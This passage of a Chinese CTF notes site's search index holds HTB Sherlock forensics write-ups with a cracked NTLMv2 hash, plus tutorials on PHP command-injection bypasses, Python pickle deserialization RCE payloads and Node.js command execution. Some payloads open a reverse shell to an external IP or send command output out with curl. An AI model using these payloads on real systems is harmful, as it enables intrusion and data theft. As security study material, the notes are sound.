26/04/2023 10:53:12\n在phpbb_log找到管理员登录记录，在最后\n登录操作为post，过滤找到最底下的记录\n第一个应该就是登录记录26/Apr/2023:11:53:12 +0100，转换成UTC时间减一即可\nTask6 link 论坛中有 LDAP 连接的明文凭证，密码是什么？ Passw0rd1\n在phpbb_config里面找到\nTask7 link 管理员用户的 User Agent 是什么？ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\n找时间靠前的adm访问记录即可\nTask8 link 承包商何时将自己加入管理员组？（UTC 时间 26/04/2023 10:53:51\nlog数据库找到\nTask9 link 承包商在什么时间下载了数据库备份？（UTC 时间） 26/04/2023 11:01:38\n日志搜backup，能找到get一个gz\nTask10 link 根据 access.log 记录，数据库备份的大小是多少字节？ 34707\n和上一题一个位置\nCampfire-1 linkTask1 link 分析域控制器安全日志，您能否确认发生 Kerberoasting 攻击的具体日期和时间？\n这种攻击方式的流程为：\n发现SPN服务 使用工具向 SPN 请求 TGS 票据 转储 .kirbi 或 ccache 或服务 HASH 的 TGS 票据 将 .kirbi 或 ccache 文件转换为可破解格式 使用hashcat等工具配合字典进行暴力破解 也就是要请求tgs票据，id为4769的日志记录此事件 翻找发现mysql服务，别的都是域控服务，大概率就是这个\n转化为utc+0时间 2024-05-21 3:18:09\nTask2 link 被攻击的服务名称是什么？\n见上一题 MSSQLService\nTask3 link 识别发生此活动的工作站至关重要。该工作站的 IP 地址是什么？\n见上一题，日志里有客户端地址 172.17.79.129\nTask4 link 既然我们已经定位到该工作站，现为您提供包括 PowerShell 日志和预取文件在内的诊断数据，以便深入分析，从而了解该端点上的活动是如何发生的。用于枚举 Active Directory 对象并可能在网络中查找可 Kerberoast 账户的文件名称是什么？\n打开powershell日志，4104为执行命令，依次翻找，找到绕过限制执行ps文件\n那下一条应该就是具体的文件位置\n找到文件路径 powerview.ps1\nTask5 link 该脚本是何时执行的？\n见上一题时间，转为utc-0 2024-05-21 03:16:32\nTask6 link 用于执行实际 kerberoasting 攻击的工具完整路径是什么？\nprefetch文件夹 Windows 中的预读取文件夹，存放系统已访问的文件的预读信息，程序首次运行时会存储有关在加载该文件时访问的所有文件的信息，还存储元数据\n工具采集信息在11:17:25结束，从17分开始查看prefetch文件夹\n可疑程序rubeus.exe 使用PECmd读取\nPECmd.exe -f \"C:\\Users\\xxx\\Downloads\\Triage\\Workstation\\2024-05-21T033012_triage_asset\\C\\Windows\\prefetch\\RUBEUS.EXE-5873E24B.pf\" --csv \"./\" C:\\Users\\Alonzo.spire\\Downloads\\Rubeus.exe\nTask7 link 该工具是何时执行以转储凭据的？\n表格有最后运行时间 2024-05-21 03:18:08\nNoxious link 入侵检测系统（IDS）设备发出警报，提示内部 Active Directory 网络中可能存在恶意设备。该系统还监测到异常的 LLMNR 协议流量，怀疑发生了 LLMNR 投毒攻击。异常流量指向 IP 地址为 172.17.79.136 的 Forela-WKstn002 工作站。作为网络取证专家，您已获得事发时段的部分数据包捕获文件。鉴于事件发生在 Active Directory 虚拟局域网内，建议结合 AD 攻击向量开展网络威胁狩猎，重点关注 LLMNR 投毒攻击。\nTask1 link 安全团队怀疑 Forela 内网中存在运行 Responder 工具的恶意设备实施 LLMNR 投毒攻击。请定位该恶意设备的 IP 地址。\nLLMNR协议在UDP 5355，所以过滤udp.port==5355\n能看到172.17.79.135对工作站172.17.79.136的LLMNR查询进行了回应，冒充了dc 答案就是172.17.79.135\nTask2 link 被入侵机器的主机名是什么？\n过滤此ip，ip.addr==172.17.79.135，有一个dhcp请求分配动态ip，里面有主机名称\n答案是kali\nTask3 link 现在我们需要确认攻击者是否获取了用户哈希值且该哈希可被破解！！被捕获哈希的用户名是什么？\n还是过滤上面的ip，有一条登录cookie数据包，说明攻击者成功破解密码并破解\n答案是john.deacon\nTask4 link 在 NTLM 流量中可以看到受害者的凭证被多次中继到攻击者的机器上。这些哈希值首次是在何时被捕获的？\nntml协议通常使用HTTP、SMB、SMTP，查看协议占比可知smb2占比最多\n过滤smb2协议 搜索dcc01，能找到工作站请求NTLM认证。从这里开始进行中间人劫持哈希。\n答案是2024-06-24 11:18:30（ 注意是 UTC-0）\nTask5 link 受害者在访问文件共享时输入了哪个拼写错误导致其凭据泄露？\ntask1可以看到请求了很多次dcc01 DCC01\nTask6 link 要获取受害用户的实际凭据，我们需要将 NTLM 协商数据包中的多个值拼接起来。NTLM 服务器质询值是多少？\n查看这个包，9291，他进行了第一次ntml challenge，是攻击者转发的流量\n找到答案\n答案：601019d191f054f1\nTask7 link 现在执行类似操作，找到 NTProofStr 的值。\n下一个客户端回复包就有\n答案：c0cc803a6d9fb5a9082253a04dbd4cd4\nTask8 link 要测试密码复杂度，可尝试从数据包捕获的信息中恢复密码。这是关键步骤，通过这种方式我们能发现攻击者是否成功破解密码以及破解速度。\n组建一个html哈希需要以下几个要素\n用户名：john.deacon 域名：FORELA server challenge：601019d191f054f1 NTproofstring：c0cc803a6d9fb5a9082253a04dbd4cd4 NTLMv2回复：去掉NTproofstring john.deacon::FORELA:601019d191f054f1:c0cc803a6d9fb5a9082253a04dbd4cd4:010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000 然后使用hashcat破解\nhashcat 2 /usr/share/wordlists/rockyou.txt -m 5600 --force 得到答案：NotMyPassword0k?\nTask9 link 为了更全面地了解事件背景，受害者当时试图访问的具体文件共享是什么？\n第一个访问的共享文件夹\n\\\\DC01\\DC-Confidential\n参考文章：0xdf/HTB Sherlock: Noxious\n"
+            }
+        );
+    index.add(
+            {
+                id:  8 ,
+                href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/rce\/",
+                title: "RCE",
+                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n",
+                content: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n# 回显只有数字情况下，使用od进行输出： od -t d1 /flag # 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。 # 16进制，先bin2hex php -r eval(hex2bin(substr(_十六进制,1))) # 63617420666c61672e706870是cat flag.php的16进制 # cat /etc/passwd echo \"636174202F6574632F706173737764\" | xxd -r -p|bash # php 十六进制绕过 system(); \"\\x73\\x79\\x73\\x74\\x65\\x6d\"(); # 或者base64/32 echo \"base64编码\"|base64 -d|bash echo \"base64编码\"|base64 -d|sh echo 'Y2F0wqAK' | base64 -d /etc/passwd # cat /etc/passwd # 八进制 # ls $(printf \"\\154\\163\") 绕过空格\n%09（url传递）(tab) %20(space) ${IFS} $IFS$9 $IFS$1 \u003c\u003e（cat\u003c\u003e/flag） \u003c（cat"
+            }
+        );
+    index.add(
+            {
+                id:  9 ,
+                href: "\/docs\/%E5%B7%A5%E5%85%B7%E7%AE%B1\/",
+                title: "工具箱",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  10 ,
+                href: "\/docs\/",
+                title: "Docs",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  11 ,
+                href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/",
+                title: "Pickle反序列化",
+                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n",
+                content: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n更多参考\nb'Vabcd\\np0\\n.'\nV：unicode编码 p：将堆栈最上面的项目复制到memo中 使用pickletools将opcode转换为易于读取的形式\nimport pickletools data=b\"\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b'1'\\nkey2=b'2'q\\x01\\x85q\\x02Rq\\x03.\" pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1'\\nkey2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 利用方法 linkR指令 link原理 link大多数题目利用__reduce__方法，其指令码为R，作用为：\n取栈顶元素为args，弹出 取栈顶为f，弹出 arg为参数，执行f，结果压入栈 此方法会在反序列化的时候执行，f会返回字符串或元组。\n选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\nb'''cos system (S'whoami' tR.''' 利用此方法构造恶意字符串：\nclass Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def __reduce__(self): return os.system, (\"ls /\",) a = pickle.dumps(Student(), protocol=3) 绕过方式 link 如果黑名单没禁全，尝试`platform.popen(cmd, mode=‘r’, bufsize=-1) 使用map class Exploit(object): def __reduce__(self): return map,(os.system,[\"ls\"]) i指令码 link b'''(S'whoami' ios system .''' 先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。\n0: ( MARK 1: S STRING 'whoami' 11: i INST 'os system' (MARK at 0) 22: . STOP o指令码 link b'''(cos system S'whoami' o.''' 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）。\n0: ( MARK 1: c GLOBAL 'os system' 12: S STRING 'whoami' 22: o OBJ (MARK at 0) 23: . STOP c指令码 link原理 link class Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def check(data): if b'R' in data: return 0 x = pickle.loads(data) if x != Student(blue.name,blue.grade): return 0 return 1 c指令码的作用是获取全局变量，故而可以通过替换rxz为blue.name即可 换成指令是cblue\\nname\\n。 原本是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00rxzq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.' 最后结果是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00namecblue\\nname\\nq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.'\n绕过 link如果题目对c指令进行了限制，只允许包含__main__这一个模块，则可以使用变量覆盖。 通过此指令引入的变量，可以看作是原变量的引用，从栈上修改他，也会修改原变量。\n先通过__main__.blue引入这个module 然后把一个dict压入栈，内容为{'name': 'rua', 'grade': 'www'} 执行b指令，会改写__main__.blue.name和 __main__.blue.grade，因此两个变量的值都变为了预期值，后面再正常压入Student对象即可 结果： b'\\x80\\x03c__main__\\nblue\\n}(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.' b指令RCE link原理 link执行build时，当inst拥有__setstate__方法时，把state交给他处理，否则合并到元组内。 所以可以先用build写入{'__setstate__': os.system}，把对象的__setstate__变为os.system，接下来利用\"ls /\"再build对象，会执行__setstate__(\"ls /\")，从而达成RCE。 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.' 执行完代码后清空栈，再压入一个正常的类即可防止报错 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.'\n绕过 link针对重写find_class的，可以利用sys.module获取危险函数。 sys.module是一个全局字典，字典的键是模块名，值是模块本身。 所以可以通过get(sys.modules,\"moduleName\")获取危险模块。\nprint(sys.modules) # 输出全部模块 最终需要构造的payload是：builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) 写成opcode：\nb'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' 其他 link 其他模块的load也可能触发pickle反序列化，如numpy.load()，使用numpy自身的数据失败后，可以尝试用pickle的格式导入。 即使代码里面没有import os，GLOBAL指令也会自动导入。 无回显时执行os.system('curl your_server/`ls / | base64`)即可在日志中查看结果。 payload: b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVcurl 47.***.***.105/`ls / | base64`\\nb.' 绕过各种限制的方式和jail一样 如双写\npk = pickle.dumps(yourobject) pk = pk.replace(b'os', b'ooss') 字符串拼接\nclass A(object): def __reduce__(self): return eval,(\"__import__('o'+'s').system('env |tee b')\",) 其他：\na = base64.b64decode(session.get('ser_data')).replace(b\"builtin\", b\"BuIltIn\").replace(b\"os\", b\"Os\").replace(b\"bytes\", b\"Bytes\") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(\"R i o b is forbidden\") pickle.loads(base64.b64decode(session.get('ser_data'))) 检测的是a有无riob，但是运行时还是ser_data，利用o和s连用组成os，替换为Os绕过 反弹shell用到i，会被检测，所以用V，能识别unicode编码\nb'''(cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 因为s的作用是从堆栈中弹出三个值，一个字典，一个键和值。键/值条目是添加到字典，它被推回到堆栈上，所以前面需要添加一个字典和一个键：\nb'''(S'ba' S'ss' dS'sdasda' (cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 手写opcode link三种print的方法：\n# __import__(\"builtins\").print('a', 'b') R = b'''cbuiltins print (S'a' S'b' tR. ''' o = b'''(cbuiltins print S'a' S'b' o. ''' i = b'''(S'a' S'b' ibuiltins print . ''' 例：执行系统命令： builtins.getattr(builtins, 'eval')(\"__import__('os').system('pwd')\") 用到c指令导入的有builtins.getattr和builtins，但pickle不能直接获取builtins一级模块，所以builtins不能直接导入，需要用： builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins')获取。 组合得到： builtins.getattr(builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins'), 'eval')(\"__import__('os').system('pwd')\") 分层编写opcode： 最内层function(\"__import__('os').system('pwd')\")\nb'''( S'__import__('os').system('pwd')' o. ''' 然后是最外层的builtins.getattr\nb'''( /////// (cbuiltins getattr arg1 S'eval' o /////// S'__import__('os').system('pwd')' o. ''' 补全arg1，从内层开始`(builtins.globals(), ‘builtins’)\nb'''((cbuiltins getattr /////// (cbuiltins globals o S'builtins' /////// S'eval' o S'__import__('os').system('pwd')' o. ''' pickletools.dis(test) 最后是builtins.getattr(builtins.dict, 'get')\nb'''((cbuiltins getattr ( /////// (cbuiltins getattr cbuiltins dict S'get' o /////// (cbuiltins globals o S'builtins' o S'eval' o S'__import__('os').system('pwd')' o. ''' 最终payload：\nb'''((cbuiltins getattr ((cbuiltins getattr cbuiltins dict S'get' o(cbuiltins globals oS'builtins' oS'eval' oS'__import__('os').system('whoami')' o. ''' "
+            }
+        );
+    index.add(
+            {
+                id:  12 ,
+                href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/",
+                title: "知识点",
+                description: "CTF知识点 link如有错误请联系https://github.com/c0ld1nk/\n",
+                content: "CTF知识点 link如有错误请联系https://github.com/c0ld1nk/\n"
+            }
+        );
+    index.add(
+            {
+                id:  13 ,
+                href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/nodejs\/",
+                title: "NodeJs",
+                description: "命令执行 link require('child_process').exec('ls'); //返回值是child_process，不能转字符串 require('child_process').execSync('ls').toString(); //返回值是字符串 require('child_process').spawnSync('ls').stdout.toString();// 返回object，toString转成字符串 //绕过简单的限制 require('child_process')['exe'+'cSync']('ls').toString() 不用child_process读取文件\n__filename //获取当前文件的绝对路径 __dirname //获取当前文件解析过后的文件夹的绝对路径 require('fs').readFileSync(__filename,'utf-8'); //读取当前文件 require('fs').readdirSync('.') //读取当前目录下所有文件 md5 link if(a \u0026\u0026 b \u0026\u0026 a.length===b.length \u0026\u0026 a!==b \u0026\u0026 md5(a+flag)===md5(b+flag)) 传入a[]=1\u0026b[]=2 得到的是[‘1’]和[‘2’] 而nodejs中数组和字符串的拼接如下：\nconsole.log(5+[6,6]); //56,6 console.log(\"5\"+6); //56 console.log(\"5\"+[6,6]); //56,6 console.log(\"5\"+[\"6\",\"6\"]); //56,6 则[‘a’]+flag== ‘a’+flag\n如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:'1'}\nlet a={ x:'1' } console.log(a+\"flag{123}\") //返回的是： [object Object]flag{123} 所以传入a[x]=1\u0026b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。\n原型链污染 link //定义一个类 function Foo() { this.bar = 1 } new Foo() //类内的方法 function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) this.bar=this.bar+1 } } (new Foo()).show() //输出1 //但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上 //使用原型prototype创建类时，就会只创建一次show方法。 function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() //输出1 //原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。 //foo对象天生就有show方法 //通过proto属性可以访问类的原型，即： foo.__proto__==Foo.prototype 总结： prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法\n",
+                content: "命令执行 link require('child_process').exec('ls'); //返回值是child_process，不能转字符串 require('child_process').execSync('ls').toString(); //返回值是字符串 require('child_process').spawnSync('ls').stdout.toString();// 返回object，toString转成字符串 //绕过简单的限制 require('child_process')['exe'+'cSync']('ls').toString() 不用child_process读取文件\n__filename //获取当前文件的绝对路径 __dirname //获取当前文件解析过后的文件夹的绝对路径 require('fs').readFileSync(__filename,'utf-8'); //读取当前文件 require('fs').readdirSync('.') //读取当前目录下所有文件 md5 link if(a \u0026\u0026 b \u0026\u0026 a.length===b.length \u0026\u0026 a!==b \u0026\u0026 md5(a+flag)===md5(b+flag)) 传入a[]=1\u0026b[]=2 得到的是[‘1’]和[‘2’] 而nodejs中数组和字符串的拼接如下：\nconsole.log(5+[6,6]); //56,6 console.log(\"5\"+6); //56 console.log(\"5\"+[6,6]); //56,6 console.log(\"5\"+[\"6\",\"6\"]); //56,6 则[‘a’]+flag== ‘a’+flag\n如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:'1'}\nlet a={ x:'1' } console.log(a+\"flag{123}\") //返回的是： [object Object]flag{123} 所以传入a[x]=1\u0026b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。\n原型链污染 link //定义一个类 function Foo() { this.bar = 1 } new Foo() //类内的方法 function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) 